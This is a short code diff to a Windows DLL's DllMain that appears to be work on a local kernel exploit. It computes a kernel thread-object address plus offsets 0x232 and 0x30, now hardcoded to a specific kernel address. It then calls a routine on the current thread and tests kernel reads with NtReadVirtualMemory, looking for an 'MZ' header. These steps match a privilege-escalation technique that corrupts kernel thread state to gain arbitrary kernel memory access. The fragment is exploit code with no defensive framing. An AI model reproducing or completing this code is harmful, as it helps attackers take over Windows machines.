@@ -83,8 +83,14 @@ BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Par
 													sizeof( CallTwos )
 											);
 
+											/*
 											CallInfo.Param1 = ( PVOID )( 
 													( ULONG_PTR )( Info->Handles[i].Object ) +
+													( ULONG_PTR )( 0x232 ) +
+													( ULONG_PTR )( 0x30 )
+											);*/
+											CallInfo.Param1 = ( PVOID )(
+													( ULONG_PTR )( 0xffffbc04abf76580 ) +
 													( ULONG_PTR )( 0x232 ) +
 													( ULONG_PTR )( 0x30 )
 											);
@@ -94,6 +100,7 @@ BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Par
 													( ( HANDLE ) - 2 ),
 													&CallInfo
 											);
+											/*
 											UCHAR Bf[2];
 											SIZE_T Ln = 2;
 											if ( ! NtReadVirtualMemory(
@@ -106,7 +113,7 @@ BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Par
 												if ( Bf[0] == 'M' && Bf[1] == 'Z' ) {
 													OutputDebugStringA("success. read dos header");
 												};
-											};
+											};*/
 										};
 									};
 								};
